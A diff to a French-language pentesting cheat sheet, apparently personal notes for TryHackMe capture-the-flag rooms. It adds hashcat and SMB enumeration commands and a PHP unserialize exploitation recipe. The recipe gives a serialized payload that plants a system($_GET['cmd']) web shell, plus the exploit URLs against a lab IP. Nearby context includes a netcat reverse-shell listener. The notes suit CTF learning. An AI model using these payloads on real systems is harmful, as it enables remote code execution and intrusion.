@@ -44,7 +44,7 @@ stty raw -echo; fg
 
 *Si accés a l'uppload de fichier penssé a upload un fichier reverse php ?*
 
-**Ne pas oublier d'écouter le porthttps://tryhackme.com/room/metasploitintro**
+**Ne pas oublier d'écouter le port**
 
 ```
 nc -lvp 4242
@@ -89,6 +89,8 @@ python2 -m SimpleHTTPServer
 
 haiti -e 42f749ade7f9e195bf475f37a44cafcb
 https://crackstation.net/
+
+hashcat -m XXX(look man) -a 0 HASH.hash /opt/wordlists/rockyou.txt
 
 JohnTheReapper
 
@@ -147,6 +149,8 @@ stegseek hellp.jpg /opt/wordlist/common.tx
 https://tryhackme.com/room/metasploitintro
 
 smbclient -L $IP 
+smbclien -NL $IP
+
 nmblookup -A $IP 
 
 
@@ -175,7 +179,31 @@ Montrer fichier caché sur ftp :
 
 *
 
-## SMB
+## Unserialize PHP
 
-nmblookup -A $IP
-smbclien -NL $IP
+Si il y a une fct 
+
+**unserialize($variable)** dans le code cherche comment ecrire dans debug une version serialisé dun payload de reverse shell en php
+
+tu serialize
+
+```php
+<?php
+class FormSubmit
+{
+   public $form_file = 'test.php';
+   public $message = '<?php system($_GET["cmd"]); ?>';
+}
+print serialize(new FormSubmit);
+?>
+```
+
+tu execute `php code.php`
+
+tu navigue vers 
+
+http://10.10.33.139/index.php?debug=O:10:%22FormSubmit%22:2:s:9:%22form_file%22;s:8:%22test.php%22;s:7:%22message%22;s:30:%22%3C?php%20system($_GET[%22cmd%22]);%20?%3E%22;}
+
+Puis vers la page que tu as créé
+
+http://10.10.33.139/test.php?cmd=INSSERT_TA_COMMANDE
